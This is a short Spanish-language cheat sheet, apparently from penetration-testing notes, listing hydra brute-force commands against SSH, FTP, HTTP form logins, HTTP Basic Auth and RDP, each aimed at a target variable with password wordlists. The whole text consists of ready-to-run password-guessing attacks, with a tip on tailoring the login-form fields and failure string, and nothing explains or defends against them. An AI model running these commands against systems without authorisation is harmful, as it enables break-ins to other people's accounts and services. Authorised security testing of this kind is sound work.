# Fuerza bruta (hydra)

## SSH / FTP
hydra -l usuario -P $(seclists -p) ssh://$T
hydra -L usuarios.txt -P $(seclists -p) ftp://$T -t 4

## HTTP login por formulario (POST)
# Ajusta la ruta, los campos y el texto de error ("Invalid")
hydra -l admin -P $(seclists -p) $T http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid"

## HTTP Basic Auth
hydra -L usuarios.txt -P $(seclists -p) -s 80 $T http-get /admin/

## Otros servicios: rdp, smb, mysql, vnc, telnet
hydra -l admin -P $(seclists -p) rdp://$T
